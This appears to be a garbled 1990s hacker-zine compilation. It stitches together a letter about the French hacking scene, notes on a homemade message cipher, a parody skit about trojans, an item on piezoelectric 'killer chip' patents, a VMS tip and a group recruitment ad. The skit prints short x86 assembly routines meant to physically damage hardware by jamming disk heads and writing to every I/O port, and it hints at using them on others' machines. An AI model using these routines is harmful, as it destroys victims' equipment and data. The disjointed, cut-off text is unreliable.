Dear Max:

The scene in France is very clear: nothing. The police look at what the
Chaos Computer Club france (CCCF) make... and the secret services work
on several formations for all the people! A lot of anti-virus softwares
are available, but some softs are sell with viruses in it (!). I paid
US$1,000 pro week like Craig Neidorf... because I "have perhaps possess
one hard-to-find NUI"! I mind that the US hacking market is the same:
you have some blue box codes available, the French hackers have some
"Carte Pastel Internationale" codes... and France Telecom don't make any
thing against that. Only some poor teenagers are arrested, but in 60%,
they don't found the good people!

Can I help you?

Introduction:
-------------

        A while back I was listening to a pro password sysop talk about the
    'evils' of hacking. His biggest point was that 'a hacker could read
    private mail from/to the person whose' account they have accessed. The
    right or wrong of that point I will leave to others to discuss/flame/get
    flamed over. What stuck with me was the fact that he like many other
    sysops and system admin, their friends and whoever else can access the
    system at high level (or in the case of DOS, can pound the local
    keyboard), can also read any text messages they wish. Some even feel that
    it is a god given right to read any mail, strange seeing that the
    government and even ma bell (remember the phone chase from _the_cuckoo_
    nest_ they could not get the phone number for they did not have a valid
    warrant in in that state) must get a search WARRANT to do the same thing.
    Well it seems what they feel god has giveth them, GodNet Raider can
    taketh away.

        So I thought there must be a simple way to make truly private
    messages to protect all from this 'hacker threat' and nosey sysops
    (etc..) as well (without having to resort to using DES and uuencode,
    for it is slow and a bit of a hassle to use a lot (but it should be noted
    this is the most secure method). Then I remembered an article I read
    in The LOD/H Technical Journal, Issue #3. [Editor's note: The Legion
    of Doom Technical Journals can be found in the CUD archives at
    ftp.eff.org. Highly recommended.] It contained a basic BASIC
    program and explanation to a simple text encryption method using
    cellular automatons by The Mentor (strongly recommended reading for
    understanding the theory behind the method).

        After converting the BASIC code for the second program to C (under
    Minix) I proceeded to make changes to (hopefully improve) it. What
    I came up with is included at the end of this file (MsgLock.c).

        Of the changes made:

            Added the use of stdin/stdout to support a wide extent of I/O
            methods.

            Used multiple cells in defining shift amount.

            Allowed the pass though of char.s not in aszValid array (raw
            output) to keep message integrity (returns and tabs that a
            message may gain/lose in some online editors).

            Added code to expand small key strings to fill out key cells.

        So I hope you find MsgLock of use and remember...

                WMIe`H-h(`[ga0)9oW-/V

MsgLock wish list/projects:
---------------------------

    MsgLock is by no means complete following are some suggestions for
    the obsessed prodigies out there who want to expand on the basic idea.

        For a more private version one can change:

            The size of the key cells (#define WIDTH xx).

            The expansion methods used to fill out the initial key cells.

            The key cell update method.

            The order of the char.s in aszValid.

            Adding/removing char.s from aszValid.

        Msglock could use a way to know when an encoded area begins and
        ends (like the 'begin'/'end' in uuencoded files) to save post
        processing on net messages.

        Removal of char.s used in quoted messages so that it will not try
        to process (cook) char.s added to quoted messages.

        Changes to allow it to be treated like a ASCII Xfer protocol in
        term packages (qmodem, boyan, kermit)/online by bbs packages (RBBS,
        etc..) as an auto encrypt for chat/general online use.

        Or many others I have not thought of.

MsgLock source code:
--------------------

        MsgLock was compiled in Minix using the ACK compatible compiler and
    under DOS using Turbo C++ using ANSI C compatible commands.

    Usage:
        msglock [-d] Key

            -d(code)    : Decode stdin to stdout (MsgLock otherwise
                            encodes stdin to stdout. -d is only
                            used for decoding if followed by a
                            space and is the first parameter following
                            the command ('-dKEY' will be used as a key
                            to encode stdin, use '-d -dKEY' instead to
                            decode)

            Key            : String of char. used to encode/decode stdin
                            to stdout. String can contain spaces.

    Examples:

        msglock key <file1.txt >file2.txt
            Encode file 'file1.txt' to 'file2.txt' using the key string
            'key'.

        msglock -d this is the key <foo
            Decode the file 'foo' to the screen using 'this is the key'
            as the key string.

        msglock knowledge is power >com1 (/dev/tty1 for minix users)
            Encode keyboard input (using the key 'knowledge is power')
            directly to the device/terminal on com port 1.

Organization: The CyberUnderground

    Da da.. da da dup... Da da.. da da dup... Da da.. da da dup...
Yes boys and girls... It time once again for your favorite waste
of humanity... Yes it the BBC's Hackit J. Squirrel and crashwinkel
The moose show... So put your antlers on and lets now go to the
magical land of frostbite Falls Min. An see what our heroes are up
to...

    Golly gee Hack... Every time I crash a sysops hard drive with
a trojan... they just reformat the drive and reinstall the
software and are up and running again... I wish there was a way
to bring them down that would really give them something to think
about...

    Maybe there is lets go see Mr. Woopie and his 3D BBC,
crashwinkel...

    So our HEROES went to see Mr. Woopie... But where confronted
by Tennessee tuxedo and his friend chumly... But a quick squeeze
of the trigger on their semi automatic weapons and a short thank
you note to the NRA... An they where in...

    So you boys want to know how to cause more than just data loss
with trojans? Well lets ask the 3D BBC...

    Thank you Mr. Woopie... It sounds like you boys want to hear
about how to force hardware problems using software... 'Wow
Hacket.I only thought you could only do major data loss with
trojans.'... Yes but there are other nasties you could pull if you
want to...

    Take this simple bit of code for example:

    ===============================================================
     mov Ax, 0508h
     mov CX, 8001h
     mov DX, 0000h
     int 13
    ===============================================================

    This small bit of codes just moves the disk heads past the inner
most track... 'But what good is that BBC?'... Well our furry little
friend... Some disks will lock and the only way to fix it is to open
the bugger up... An since the only way to be sure this will or won't
work is to try it... Well...

    Or how about this bit of code:

    ===============================================================
             xor Al, Al
     NextPass:
             mov DX,ffffh
     NextPort:
             out DX, AL
             dec DX
             jnz NextPort
             inc AL
             jmp short NextPass
    ===============================================================

    We like to call it armageddon... 'Ohhh, Ahhhh'... It simply
looks for and writes to every port in the system... An based
on the hardware in the system it can... Toast monitors, Change CMOS
values, Change stepper rates, Change voltages (to burn/disable cards,
boards, and memory), Reek havoc on co-processers, Disable networks,
As well as other nasties too numerous to mention... Seeing that there
is some time involved in writing all those ports... The poor fool
has some time to guess what is going on and shut the computer down
(oh about 4 min.)... 'But we can't test things like that on our
computers.' 'How will we know if it will work or not.'... Who said
to test it on your systems... Not that we would suggest you test
it on others systems... That would make you a wast of humanity
like...

Invisible Killer Chips Now Available


Intelligence Newsletter (10 rue du Sentier, 75002 Paris, France)
No. 186 (Jan. 29, 1992), page 2, ISSN 0997-7139
By: Jean-Bernard Condat (CCCF, B.P. 8005, 69351 Lyon Cedex 08, France)


  The military use of computer viruses is often overblown, if not just
simple disinformation as in the recent Iraqi case. But researchers at
Boston University have developed and patented (U.S. patent 5 049 775)
an infinitely more offensive and effective anti-computer agent: the
silicon ant. Micro-electronics has perfected technologies for making
toys and machines so small that they are invisible.

  Using piezoelectric ceramics which expand or contract under an
electric current, the researchers constructed a microscopic ship with
three "legs" on each side and a "cutter" in front. By alternating
current in different sides of each "leg", it bends forward or backward.

  Under remote control the killer chips can be "walked" into a computer
and cut up other microscopic chips, turn around and "walk" away, leaving
invisible damage in the computer system. The killer chips could be solar
powered and therefore have an indefinite life-span.

Abstract (Basic): WO 9003665

         An electrical micromachine is made by securing films (20,22) of
    piezoelectric material to the top surfaces (16,18) of crystalline
    silicon beams (12,14) projecting from a crystalline silicon body (10)
    to form a bimorph structure. A potential applied across the ends
    (24,26) of the piezoelectric films causes the beams to deflect. The
    piezoelectric material used is zinc oxide.
          A number of such micromachines can be assembled to form a robot,
    and when a foot (30) is provided the machine can move itself along a
    surface by sequential deflecting and straightening of the beams. The
    foot can be associated with a toothed wheel to produce rotary motion.
    The micromachine may be solar powered, and can be associated with
    sensors or a microprocessor with programmable memory.
          USE - Microsurgical tools, and robots for grasping, carrying or
    cutting tasks. @(33pp Dwg.No.1/10)@

Abstract (US): 9140 US 5049775

         The piezoelectric actuation machine comprises two cantilever beams
    extending from a frame. The beams comprise a piezoelectric material
    such that application of an electric potential across the material of
    each beam rotationally diplaces the first and second beams relative to
    each other.
           An actuating member is secured between displaceable surfaces on
    the beams and extends orthogonally from a plane through the beams such
    that relative displacement of the beams displaces a portion of the
    member in a direction orthogonal to beam displacement. A rigid object
    contacting the displaced portion of the member is translated relative
    to the member and the frame.
         USE - For piezoelectric micromachines e.g. small robot or cutting
    tool. @(17pp)@

    On a VMS system you can not simply type 'CC HELLO.C' to compile a C
program. First you have to define a Link Library. This command will work
for a generic program that does not need floating point:

    DEFINE LNK$LIBRARY SYS$LIBRARY:VAXCRTL

UPi has once again returned and it no longer the shit group it used to be in
the past.  UPi is a group that puts out newsletters that deals with the
H/P/C/A world.  In the past, our newsletters averaged only 1 article in length
(which in size means a range of 25-50k) but now in the all new UPi newsletter
we have decided to expand it so it will contain more articles (and all quality
articles which means no more of those little shitty files that contains
useless information).  What we are looking for are quality members and sites
that are willing to contribute to the group and support the group.  We are
also looking for people who can freelance write for us too.  We are looking
for people who are experienced in electronics and chemistry, and as well as
any of the P/H/C/A topics.  If you would like to join UPi either as a site or
a member or become a freelance writer for us please send mail to The Lost
Avenger via internet e-mail to the following address Tla@Maria.Wustl.Edu or
you can contact him on his voice mail box at 416-402-0788.

[Editor's note: This is an edited version of Hawkeye's excellent e-mail
FutureCulture listing. It is intended to deal with the entire CyberPunk/Rave
scene and thus is rather large and comprehensive. I edited out most of the
cultural listings, and left most of the tech listings, since I intend for
the DFP to be more of a technical journal. However it is highly recommended
that you send him mail and get on the mail list.]
